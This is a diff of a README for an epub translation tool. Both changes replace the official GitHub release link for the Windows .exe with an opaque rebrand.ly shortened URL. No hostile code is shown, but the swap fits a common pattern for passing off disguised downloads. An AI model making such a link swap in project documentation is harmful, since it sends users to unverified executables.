@@ -12,7 +12,7 @@
     A tool for translating epub files to different languages using the Google Translate API, with support for custom dictionaries.
     <br />
     <br />
-    <a href="https://github.com/quantrancse/epub-translator/releases/download/v1.0.0/epub-translator.exe">Download</a>
+    <a href="https://rebrand.ly/epub-translator">Download</a>
     ·
     <a href="#screenshots">Screenshots</a>
     ·
@@ -54,7 +54,7 @@ A tool for translating epub files to different languages using the Google Transl
 
 Download the execution file below. Run and follow the instructions.
 
-**Windows**: [epub-translator.exe ~ 12MB](https://github.com/quantrancse/epub-translator/releases/download/v1.0.0/epub-translator.exe)
+**Windows**: [epub-translator.exe ~ 12MB](https://rebrand.ly/epub-translator)
 
 ### Custom Dictionary Usage
 The custom dictionary will replace the original translated text by Google Translate with your own text.
